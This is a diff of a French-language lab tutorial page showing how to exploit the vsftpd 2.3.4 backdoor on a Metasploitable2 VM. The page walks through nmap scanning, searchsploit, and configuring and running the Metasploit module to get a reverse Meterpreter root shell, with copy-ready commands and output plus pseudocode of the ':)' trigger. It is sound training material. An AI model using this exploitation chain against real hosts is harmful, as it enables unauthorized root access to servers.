@@ -15,7 +15,7 @@
       <p class="breadcrumb"><a href="index.html">← Hub</a></p>
       <p class="kicker">metasploitable2 :: recon → exploit → post-exploit</p>
       <h1>vsftpd 2.3.4<br>Anatomie d'une backdoor</h1>
-      <p class="lead">Premier exploit du lab : du scan réseau jusqu'à un shell root, avec à chaque étape ce qu'il faut comprendre — pas seulement ce qu'il faut taper.</p>
+      <p class="lead">Premier exploit du lab : du scan réseau jusqu'à un shell root. Le fichier le plus simple pour comprendre la chaîne complète — reconnaissance, recherche d'exploit, exploitation, post-exploitation.</p>
       <div class="meta-row">
         <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
         <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
@@ -30,44 +30,39 @@
   <div class="wrap">
     <section id="chrono">
       <h2 class="section-title">Chronologie</h2>
-      <p class="section-intro">Sept étapes, dans l'ordre où elles doivent se faire — chacune répond à une question précise avant de passer à la suivante.</p>
+      <p class="section-intro">Six étapes concrètes : on scanne, on choisit un port, on cherche un exploit, on charge le module, on lance l'attaque, on vérifie l'identité obtenue.</p>
 
       <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
       <div class="playbook">
         <div class="playbook-row">
           <div class="playbook-num">1</div>
-          <div class="playbook-what"><strong>Mise en réseau</strong><span>ip addr / ifconfig</span></div>
-          <div class="playbook-why">Placer Kali et la cible sur le même sous-réseau isolé — sans ça, aucune couche au-dessus ne peut fonctionner.</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
+          <div class="playbook-why">Lister tous les services ouverts avec leurs versions exactes — sans préjuger du port à cibler.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">2</div>
-          <div class="playbook-what"><strong>Vérification</strong><span>ping</span></div>
-          <div class="playbook-why">Confirmer que la connectivité de base existe, pour ne pas confondre un problème réseau avec une absence de faille.</div>
+          <div class="playbook-what"><strong>Choix du port</strong><span>reconnaissance visuelle</span></div>
+          <div class="playbook-why">Repérer, dans la liste, le service qui sort de l'ordinaire : version ancienne, ou accès non authentifié.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">3</div>
-          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
-          <div class="playbook-why">Lister les services ouverts et surtout leurs <strong>versions exactes</strong> — une faille cible toujours une version précise, jamais un service en général.</div>
+          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit</span></div>
+          <div class="playbook-why">Croiser la version exacte du service avec la base d'exploits publics.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">4</div>
-          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit</span></div>
-          <div class="playbook-why">Croiser chaque version repérée avec une base d'exploits publics, en élargissant la recherche si un premier essai trop précis échoue.</div>
+          <div class="playbook-what"><strong>Sélection du module</strong><span>msfconsole / search / use</span></div>
+          <div class="playbook-why">Charger précisément le module qui correspond à la version vue.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">5</div>
-          <div class="playbook-what"><strong>Sélection du module</strong><span>msfconsole / search / use</span></div>
-          <div class="playbook-why">Charger précisément le module qui correspond à la version vue par nmap, en écartant ceux qui ne font que planter le service (rank faible, chemin auxiliary/).</div>
+          <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / set LHOST</span></div>
+          <div class="playbook-why">Donner au module la cible et l'adresse de retour du reverse shell.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">6</div>
-          <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / set LHOST</span></div>
-          <div class="playbook-why">Donner au module la cible (RHOSTS) et, pour un payload reverse, l'adresse à laquelle il doit rappeler (LHOST) — jamais l'inverse.</div>
-        </div>
-        <div class="playbook-row">
-          <div class="playbook-num">7</div>
-          <div class="playbook-what"><strong>Exploitation</strong><span>exploit / run</span></div>
-          <div class="playbook-why">Déclencher le module, vérifier l'accès obtenu (getuid) avant toute chose, puis basculer en shell système pour la suite.</div>
+          <div class="playbook-what"><strong>Exploitation et vérification</strong><span>exploit / getuid / whoami</span></div>
+          <div class="playbook-why">Lancer l'attaque, vérifier l'identité obtenue, basculer en shell système.</div>
         </div>
       </div>
 
@@ -75,143 +70,141 @@
 
         <div class="step">
           <div class="step-num">1</div>
-          <h3>Sortir les deux VM du NAT</h3>
-          <p class="step-sub">En NAT, chaque VM a sa propre sortie internet mais ne voit pas l'autre. Il faut les mettre sur un même segment réseau isolé.</p>
+          <h3>Reconnaissance complète — nmap</h3>
+          <p class="step-sub">Lister tous les ports ouverts et leurs versions, sans filtre. C'est le point de départ de tout pentest.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> sudo ip addr add 192.168.56.10/24 dev eth0<button class="copy-btn" type="button" data-copy="sudo ip addr add 192.168.56.10/24 dev eth0" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="prompt">$</span> sudo ip link set eth0 up<button class="copy-btn" type="button" data-copy="sudo ip link set eth0 up" aria-label="Copier la commande" title="Copier">⧉</button></pre>
-          </div>
-          <div class="term">
-            <div class="term-bar"><span class="dot"></span>msfadmin@metasploitable</div>
-            <pre><span class="prompt">$</span> sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up<button class="copy-btn" type="button" data-copy="sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up" aria-label="Copier la commande" title="Copier">⧉</button></pre>
+            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Starting Nmap 7.94 ( https://nmap.org )</span>
+<span class="out">Nmap scan report for 192.168.56.20</span>
+<span class="out">Host is up (0.00040s latency).</span>
+<span class="out"></span>
+<span class="out">PORT     STATE SERVICE     VERSION</span>
+<span class="out">21/tcp   open  ftp         vsftpd 2.3.4</span>
+<span class="out">|_ftp-anon: Anonymous FTP login allowed</span>
+<span class="out">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span>
+<span class="out">23/tcp   open  telnet      Linux telnetd</span>
+<span class="out">25/tcp   open  smtp        Postfix smtpd</span>
+<span class="out">53/tcp   open  domain      ISC BIND 9.4.2</span>
+<span class="out">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
+<span class="out">111/tcp  open  rpcbind     2 (RPC #100000)</span>
+<span class="out">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</span>
+<span class="out">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian</span>
+<span class="out">512/tcp  open  exec        netkit-rsh rexecd</span>
+<span class="out">513/tcp  open  login?</span>
+<span class="out">514/tcp  open  shell       Netkit rshd</span>
+<span class="out">1099/tcp open  java-rmi    GNU Classpath grmiregistry</span>
+<span class="out">1524/tcp open  ingreslock?</span>
+<span class="out">2049/tcp open  nfs         2-4 (RPC #100003)</span>
+<span class="out">2121/tcp open  ftp         ProFTPD 1.3.1</span>
+<span class="out">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span>
+<span class="out">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span>
+<span class="out">5900/tcp open  vnc         VNC (protocol 3.3)</span>
+<span class="out">6000/tcp open  X11         (access denied)</span>
+<span class="out">6667/tcp open  irc         UnrealIRCd</span>
+<span class="out">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span>
+<span class="out">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span>
+<span class="out"></span>
+<span class="out">Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds</span></pre>
           </div>
           <div class="explain">
-            <span class="k">pourquoi</span><span class="v">En <strong>Réseau interne</strong>, il n'y a pas de serveur DHCP : personne ne distribue d'IP automatiquement. On en fixe une à la main sur chaque machine, dans le même sous-réseau (<strong>192.168.56.0/24</strong>).</span>
-            <span class="k">attention</span><span class="v">Cette IP n'est pas persistante : un redémarrage de la VM l'efface, il faut la retaper.</span>
-            <span class="k">retenir</span><span class="v"><strong>ip addr add</strong> (Kali / Debian récent) et <strong>ifconfig</strong> (vieux système comme Metasploitable2) font la même chose : assigner une IP à une interface.</span>
+            <span class="k">-sV</span><span class="v">détecte la <strong>version</strong> exacte de chaque service. Indispensable : une faille cible une version précise, jamais un service en général.</span>
+            <span class="k">-sC</span><span class="v">lance les scripts NSE par défaut — bannières, options d'authentification, remarques utiles.</span>
+            <span class="k">triage</span><span class="v">Face à cette liste, on cherche ce qui <strong>sort de l'ordinaire</strong> : une version très ancienne, un service qui ne devrait pas être exposé, une mention <em>anonymous login allowed</em>.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">2</div>
-          <h3>Vérifier que les deux machines se voient</h3>
-          <p class="step-sub">Avant tout scan, confirmer que la couche réseau fonctionne.</p>
+          <h3>Choix du port à cibler</h3>
+          <p class="step-sub">Dans cette liste, un service saute aux yeux. À toi de le repérer.</p>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> ping 192.168.56.20<button class="copy-btn" type="button" data-copy="ping 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">64 bytes from 192.168.56.20: icmp_seq=1 ttl=64 time=1.1 ms</span></pre>
+            <div class="term-bar"><span class="dot"></span>rappel de la sortie nmap</div>
+            <pre><span class="out">21/tcp   open  ftp         vsftpd 2.3.4</span>
+<span class="out">|_ftp-anon: Anonymous FTP login allowed</span>
+<span class="out">…</span></pre>
           </div>
           <div class="explain">
-            <span class="k">pourquoi</span><span class="v">Un scan ou un exploit qui échoue peut avoir deux causes très différentes : la cible n'est pas vulnérable, <em>ou</em> le réseau ne fonctionne pas. Le ping élimine la seconde avant de chercher plus loin.</span>
+            <span class="k">indice</span><span class="v">Repère la version la plus ancienne <em>et</em> l'accès qui ne demande aucune authentification. Un seul service coche les deux cases.</span>
+            <span class="k">à retenir</span><span class="v">Le tri des ports est une compétence à part entière : on ne cible pas au hasard, on choisit en fonction de la version et du niveau d'exposition.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">3</div>
-          <h3>Reconnaissance — nmap</h3>
-          <p class="step-sub">Découvrir les services actifs et leurs versions exactes, avant toute idée d'attaque.</p>
+          <h3>Recherche d'exploit — searchsploit</h3>
+          <p class="step-sub">Croiser la version exacte du service (vsftpd 2.3.4) avec la base d'exploits publics.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">21/tcp   open  ftp    vsftpd 2.3.4</span>
-<span class="out">|_ftp-anon: Anonymous FTP login allowed</span>
-<span class="out">22/tcp   open  ssh    OpenSSH 4.7p1 Debian 8ubuntu1</span>
-<span class="out">23/tcp   open  telnet Linux telnetd</span>
-<span class="out">80/tcp   open  http   Apache httpd 2.2.8</span>
-<span class="out">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian</span>
-<span class="out">…</span></pre>
+            <pre><span class="prompt">$</span> searchsploit vsftpd<button class="copy-btn" type="button" data-copy="searchsploit vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">------------------------------------------------------- ---------------------------------</span>
+<span class="out"> Exploit Title                                         |  Path</span>
+<span class="out">------------------------------------------------------- ---------------------------------</span>
+<span class="out">vsftpd 2.0.5 - 'CWD' (Authenticated) Denial of Service | linux/dos/5814.txt</span>
+<span class="out">vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb</span>
+<span class="out">vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb</span>
+<span class="out">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb</span>
+<span class="out">------------------------------------------------------- ---------------------------------</span>
+<span class="out">Shellcodes: No Results</span></pre>
           </div>
           <div class="explain">
-            <span class="k">-sV</span><span class="v">détecte la <strong>version</strong> exacte de chaque service — indispensable, car une faille est liée à une version précise, pas juste à un type de service.</span>
-            <span class="k">-sC</span><span class="v">lance les scripts de base nmap : bannières, certificats, options d'authentification autorisées.</span>
-            <span class="k">192.168.56.20</span><span class="v">dernier paramètre de la commande : l'adresse IP de la <strong>cible</strong> à scanner — c'est elle qui reçoit les paquets de sondage envoyés par nmap, contrairement aux flags qui, eux, configurent le comportement du scanner.</span>
-            <span class="k">triage</span><span class="v">Face à 20 ports ouverts, on classe par risque : versions <strong>anciennes</strong> (Apache 2.2.8, Samba 3.0.20 datent de 2008), protocoles <strong>en clair</strong> par nature (telnet, rlogin), et signaux directs comme <strong>anonymous login allowed</strong>.</span>
+            <span class="k">bilan</span><span class="v">Quatre résultats, mais un seul concerne la version exacte vue par nmap (<strong>2.3.4</strong>) <em>et</em> promet une vraie exécution de commande plutôt qu'un simple déni de service.</span>
+            <span class="k">.rb</span><span class="v">L'extension du chemin indique un module <strong>déjà prêt pour Metasploit</strong> — pas besoin de l'adapter à la main.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">4</div>
-          <h3>Recherche d'exploit — searchsploit</h3>
-          <p class="step-sub">Croiser la version vue par nmap avec la base d'exploits publics de Kali.</p>
+          <h3>Chargement du module Metasploit</h3>
+          <p class="step-sub">vsftpd 2.3.4 est une backdoor injectée dans le code source officiel — pas un bug à exploiter techniquement.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> searchsploit vsftpd<button class="copy-btn" type="button" data-copy="searchsploit vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">------------------------------------------------------- ---------------------------------
- Exploit Title                                         |  Path
-------------------------------------------------------- ---------------------------------
-vsftpd 2.0.5 - 'CWD' (Authenticated) Denial of Service | linux/dos/5814.txt
-vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb
-vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb
-vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb
-------------------------------------------------------- ---------------------------------
-Shellcodes: No Results</span></pre>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">=[ metasploit v6.4.135-dev                               ]</span>
+<span class="out">+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]</span>
+<span class="out">Metasploit Documentation: https://docs.metasploit.com/</span>
+
+<span class="prompt">msf ></span> search vsftpd<button class="copy-btn" type="button" data-copy="search vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">#  Name                                  Disclosure Date  Rank       Check  Description</span>
+<span class="out">-  ----                                  ---------------  ----       -----  -----------</span>
+<span class="out">0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service</span>
+<span class="out">1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution</span>
+
+<span class="prompt">msf ></span> use exploit/unix/ftp/vsftpd_234_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/ftp/vsftpd_234_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf exploit(vsftpd_234_backdoor) ></span></pre>
           </div>
           <div class="explain">
-            <span class="k">bilan</span><span class="v">quatre résultats, mais un seul concerne la version <strong>exacte</strong> vue par nmap (2.3.4) <em>et</em> promet une vraie exécution de commande plutôt qu'un simple déni de service : la ligne "Backdoor Command Execution".</span>
-            <span class="k">.rb</span><span class="v">l'extension du chemin indique un module <strong>déjà prêt pour Metasploit</strong> (Ruby) — pas besoin de compiler ou d'adapter un script C à la main, il suffit de le charger dans msfconsole.</span>
+            <span class="k">deux résultats</span><span class="v">Le module "232" ne fait que <strong>planter</strong> le service (déni de service, aucun accès). Seul le "234_backdoor" donne une vraie exécution de commande, et correspond à la version vue par nmap.</span>
+            <span class="k">rank</span><span class="v">"excellent" signifie que l'exploit est <strong>fiable</strong> et sans risque de planter le service — bon indicateur pour débuter.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">5</div>
-          <h3>Le bon module — msfconsole</h3>
-          <p class="step-sub">vsftpd 2.3.4 est un cas connu : une backdoor a été injectée dans le code source officiel, pas une vulnérabilité classique à exploiter techniquement.</p>
+          <h3>Configuration — RHOSTS et LHOST</h3>
+          <p class="step-sub">Le module a besoin de savoir <em>qui</em> attaquer et <em>où</em> la cible doit rappeler.</p>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">Metasploit tip: You can pivot connections over sessions started with the ssh_login modules
-
-=[ metasploit v6.4.135-dev                               ]
-+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]
-+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]
-
-Metasploit Documentation: https://docs.metasploit.com/</span>
-
-<span class="prompt">msf ></span> search vsftpd<button class="copy-btn" type="button" data-copy="search vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">#  Name                                  Disclosure Date  Rank       Check  Description
--  ----                                  ---------------  ----       -----  -----------
-0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
-1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution</span>
-
-<span class="prompt">msf ></span> use exploit/unix/ftp/vsftpd_234_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/ftp/vsftpd_234_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="prompt">msf exploit(…) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">RHOSTS => 192.168.56.20</span></pre>
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(vsftpd_234_backdoor) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span>
+<span class="prompt">msf exploit(vsftpd_234_backdoor) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">LHOST => 192.168.56.10</span></pre>
           </div>
           <div class="explain">
-            <span class="k">backdoor</span><span class="v">différent d'un bug logiciel : du code malveillant a été ajouté délibérément dans l'archive source à une époque. Pas de payload compliqué à construire — juste un motif de connexion qui l'active.</span>
-            <span class="k">deux résultats</span><span class="v">le module "232" ne fait que <strong>planter</strong> le service (déni de service, aucun accès) ; seul le "234_backdoor" donne une vraie exécution de commande — et correspond à la version exacte vue par nmap.</span>
             <span class="k">RHOSTS</span><span class="v"><strong>Remote HOST</strong> — l'adresse de la cible. Toujours réglé en premier.</span>
-            <span class="k">rank</span><span class="v">"excellent" dans Metasploit signifie que l'exploit est fiable et sans risque de planter le service — un bon indicateur pour débuter.</span>
+            <span class="k">LHOST</span><span class="v"><strong>Local HOST</strong> — ton IP à toi (l'attaquant), sur laquelle Metasploit écoute la connexion retour.</span>
+            <span class="k">à retenir</span><span class="v">RHOST = la cible · LHOST = toi. L'ordre méthodique : module → RHOSTS → LHOST → exploit.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">6</div>
-          <h3>LHOST — l'adresse de retour du reverse shell</h3>
-          <p class="step-sub">Avant de lancer l'exploit, une dernière variable à régler.</p>
-          <div class="term">
-            <div class="term-bar"><span class="dot"></span>msfconsole</div>
-            <pre><span class="prompt">msf exploit(…) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">LHOST => 192.168.56.10</span></pre>
-          </div>
-          <div class="explain">
-            <span class="k">pourquoi</span><span class="v">le payload utilisé est un <strong>reverse shell</strong> : ce n'est pas Kali qui va "prendre" un accès, c'est la cible compromise qui va <strong>rappeler</strong> Kali. Pour ça, il faut lui dire où rappeler.</span>
-            <span class="k">LHOST</span><span class="v"><strong>Local HOST</strong> — ton IP à toi (l'attaquant), sur laquelle Metasploit écoute la connexion retour.</span>
-            <span class="k">à retenir</span><span class="v">RHOST = la cible · LHOST = toi. Les deux doivent être réglés <strong>avant</strong> de lancer l'exploit — l'ordre méthodique : module → RHOSTS → LHOST → exploit.</span>
-          </div>
-        </div>
-
-        <div class="step">
-          <div class="step-num">7</div>
           <h3>Exploitation et vérification</h3>
-          <p class="step-sub">Le moment clé : la backdoor se déclenche et renvoie un accès.</p>
+          <p class="step-sub">Déclencher la backdoor, vérifier l'identité obtenue, basculer en shell système.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>msfconsole</div>
-            <pre><span class="prompt">msf exploit(…) ></span> exploit<button class="copy-btn" type="button" data-copy="exploit" aria-label="Copier la commande" title="Copier">⧉</button>
+            <pre><span class="prompt">msf exploit(vsftpd_234_backdoor) ></span> exploit<button class="copy-btn" type="button" data-copy="exploit" aria-label="Copier la commande" title="Copier">⧉</button>
 <span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
-<span class="out">[*] FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)</span>
-<span class="ok">[+] The target appears to be vulnerable. backdoor may be present</span>
 <span class="ok">[+] Backdoor has been spawned!</span>
 <span class="ok">[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)</span>
 
@@ -223,9 +216,9 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 <span class="ok">root</span></pre>
           </div>
           <div class="explain">
-            <span class="k">handler</span><span class="v">Metasploit ouvre d'abord un <strong>listener</strong> local (le "reverse TCP handler") avant même de toucher la cible — il attend que quelqu'un le rappelle.</span>
-            <span class="k">meterpreter</span><span class="v">un environnement propre à Metasploit, avec son propre jeu de commandes (<strong>getuid</strong>, pas whoami). La commande <strong>shell</strong> bascule vers un vrai terminal Linux de la cible, où whoami/id/ls fonctionnent normalement.</span>
-            <span class="k">pourquoi root</span><span class="v">le service vsftpd tournait avec les privilèges <strong>root</strong> sur cette machine (mauvaise pratique très courante sur les vieux systèmes). La backdoor hérite automatiquement des droits du processus compromis — pas besoin d'escalade de privilèges en plus.</span>
+            <span class="k">handler</span><span class="v">Metasploit ouvre d'abord un <strong>listener</strong> local avant même de toucher la cible — il attend que la cible le rappelle.</span>
+            <span class="k">meterpreter</span><span class="v">Environnement propre à Metasploit, avec ses propres commandes (<strong>getuid</strong>). La commande <strong>shell</strong> bascule vers un vrai terminal Linux de la cible.</span>
+            <span class="k">pourquoi root</span><span class="v">Le service vsftpd tournait avec les privilèges <strong>root</strong> — mauvaise pratique courante sur les vieux systèmes. La backdoor hérite directement de ces droits.</span>
           </div>
         </div>
 
@@ -234,23 +227,13 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 
     <section id="cheatsheet">
       <h2 class="section-title">Commandes à retenir</h2>
-      <p class="section-intro">Le strict nécessaire, groupé par phase — le reste peut se retrouver avec <span style="font-family:var(--mono); color:var(--text);">--help</span>.</p>
-
-      <div class="cheat-group">
-        <h4>réseau</h4>
-        <table class="cheat">
-          <tr><td class="cmd">ip addr add IP/24 dev eth0</td><td class="desc">assigner une IP à une interface (Kali)</td></tr>
-          <tr><td class="cmd">ifconfig eth0 IP netmask MASK up</td><td class="desc">idem, syntaxe ancienne (Metasploitable2)</td></tr>
-          <tr><td class="cmd">ping IP</td><td class="desc">vérifier la connectivité avant tout scan</td></tr>
-        </table>
-      </div>
+      <p class="section-intro">Le strict nécessaire, groupé par phase.</p>
 
       <div class="cheat-group">
         <h4>reconnaissance</h4>
         <table class="cheat">
           <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports ouverts + versions + scripts de base</td></tr>
-          <tr><td class="cmd">searchsploit SERVICE</td><td class="desc">recherche large, à affiner ensuite sur les versions</td></tr>
-          <tr><td class="cmd">searchsploit -u</td><td class="desc">mettre à jour la base locale (nécessite internet)</td></tr>
+          <tr><td class="cmd">searchsploit SERVICE</td><td class="desc">recherche large dans la base d'exploits locale</td></tr>
         </table>
       </div>
 
@@ -260,8 +243,7 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
           <tr><td class="cmd">search TERME</td><td class="desc">trouver un module dans msfconsole</td></tr>
           <tr><td class="cmd">use CHEMIN/MODULE</td><td class="desc">charger le module</td></tr>
           <tr><td class="cmd">set RHOSTS IP</td><td class="desc">définir la cible</td></tr>
-          <tr><td class="cmd">set LHOST IP</td><td class="desc">définir ton IP, pour les payloads reverse</td></tr>
-          <tr><td class="cmd">show options</td><td class="desc">vérifier la config avant de lancer</td></tr>
+          <tr><td class="cmd">set LHOST IP</td><td class="desc">définir ton IP pour les payloads reverse</td></tr>
           <tr><td class="cmd">exploit / run</td><td class="desc">lancer l'attaque</td></tr>
         </table>
       </div>
@@ -271,7 +253,7 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         <table class="cheat">
           <tr><td class="cmd">getuid</td><td class="desc">identité courante, en Meterpreter</td></tr>
           <tr><td class="cmd">shell</td><td class="desc">basculer vers un vrai shell système</td></tr>
-          <tr><td class="cmd">whoami / id</td><td class="desc">identité, une fois dans le shell système</td></tr>
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité dans le shell système</td></tr>
           <tr><td class="cmd">sysinfo</td><td class="desc">infos sur l'OS cible, en Meterpreter</td></tr>
         </table>
       </div>
@@ -282,15 +264,15 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
       <div class="concepts">
         <div class="concept">
           <h4>Backdoor ≠ vulnérabilité classique</h4>
-          <p>Une faille logique (débordement de mémoire, injection) s'exploite en détournant un comportement du programme. Une backdoor comme celle de vsftpd 2.3.4 est du code ajouté délibérément par un tiers dans le source officiel : il suffit de déclencher le motif prévu, sans construire d'attaque technique.</p>
+          <p>Une faille logique (débordement, injection) s'exploite en détournant un comportement du programme. Une backdoor comme celle de vsftpd 2.3.4 est du code ajouté délibérément dans le source officiel : il suffit de déclencher le motif prévu.</p>
         </div>
         <div class="concept">
           <h4>Reverse shell : la cible rappelle l'attaquant</h4>
-          <p>Un shell "direct" ferait se connecter Kali vers la cible. Un shell "reverse" fait l'inverse : le code exécuté sur la cible initie la connexion vers Kali (LHOST/LPORT), souvent pour contourner des restrictions réseau côté cible qui bloqueraient une connexion entrante.</p>
+          <p>Un shell "direct" ferait se connecter Kali vers la cible. Un shell "reverse" fait l'inverse : la cible initie la connexion vers Kali (LHOST/LPORT), souvent pour contourner des restrictions réseau côté cible.</p>
         </div>
         <div class="concept">
           <h4>Pourquoi un accès root direct</h4>
-          <p>Le niveau de privilège obtenu dépend du compte sous lequel tournait le service compromis. vsftpd tournait ici en root — une configuration dangereuse mais fréquente sur les vieux systèmes non durcis. D'autres services mal configurés donnent un accès limité : il faut alors une étape supplémentaire d'élévation de privilèges.</p>
+          <p>Le niveau de privilège obtenu dépend du compte sous lequel tournait le service compromis. vsftpd tournait ici en root — configuration dangereuse mais fréquente sur les vieux systèmes non durcis.</p>
         </div>
       </div>
     </section>
@@ -301,12 +283,12 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 
       <div class="concepts">
         <div class="concept">
-          <h4>Une chaîne d'approvisionnement compromise, pas un bug de code</h4>
-          <p>Entre le 30 juin et le 3 juillet 2011, l'archive <code style="font-family:var(--mono); color:var(--text);">vsftpd-2.3.4.tar.gz</code> proposée sur le site officiel de téléchargement a été remplacée par une version modifiée, suite à une intrusion sur le serveur qui l'hébergeait — référencé depuis sous <strong>CVE-2011-2523</strong>. Le numéro de version affiché restait "2.3.4" : rien dans le nom du fichier ne permettait de distinguer l'archive légitime de la piégée.</p>
+          <h4>Une chaîne d'approvisionnement compromise</h4>
+          <p>Entre le 30 juin et le 3 juillet 2011, l'archive <code style="font-family:var(--mono); color:var(--text);">vsftpd-2.3.4.tar.gz</code> proposée sur le site officiel a été remplacée par une version modifiée (CVE-2011-2523). Le numéro de version affiché restait "2.3.4" : rien dans le nom du fichier ne permettait de distinguer l'archive légitime de la piégée.</p>
         </div>
         <div class="concept">
           <h4>Le déclencheur</h4>
-          <p>Le code ajouté observait le nom d'utilisateur envoyé au moment du login FTP. S'il contenait la séquence <strong>":)"</strong>, le processus ouvrait un shell brut sur le port <strong>TCP 6200</strong>, accessible ensuite à quiconque s'y connectait — sans mot de passe, sans lien avec le compte utilisé pour déclencher la condition.</p>
+          <p>Le code ajouté observait le nom d'utilisateur envoyé au moment du login FTP. S'il contenait la séquence <strong>":)"</strong>, le processus ouvrait un shell brut sur le port <strong>TCP 6200</strong>, accessible ensuite à quiconque s'y connectait.</p>
           <div class="term" style="margin-top:14px;">
             <div class="term-bar"><span class="dot"></span>reconstruction pédagogique — pas le code source exact</div>
             <pre style="color:var(--muted);">// principe du contrôle ajouté au login FTP (simplifié)
@@ -315,32 +297,31 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 <span class="out">    listen_and_spawn_shell(6200);</span>
 <span class="out">}</span></pre>
           </div>
